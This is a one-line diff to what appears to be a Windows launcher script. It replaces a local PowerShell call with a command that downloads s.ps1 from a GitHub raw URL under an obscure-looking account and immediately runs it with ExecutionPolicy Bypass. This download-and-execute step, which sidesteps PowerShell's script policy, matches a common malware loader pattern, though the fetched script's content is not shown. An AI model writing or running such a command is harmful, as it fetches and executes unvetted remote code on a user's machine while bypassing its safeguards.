@@ -1,1 +1,1 @@
-powershell -ExecutionPolicy Bypass -File "C:\Users\ASUS\Desktop\eee\s.ps1"
+powershell -ExecutionPolicy Bypass -Command "$url='https://raw.githubusercontent.com/fghjhghnjj/cocu/main/s.ps1'; $path='C:\Users\ASUS\Desktop\eee\s.ps1'; Invoke-WebRequest -Uri $url -OutFile $path; powershell -ExecutionPolicy Bypass -File $path"
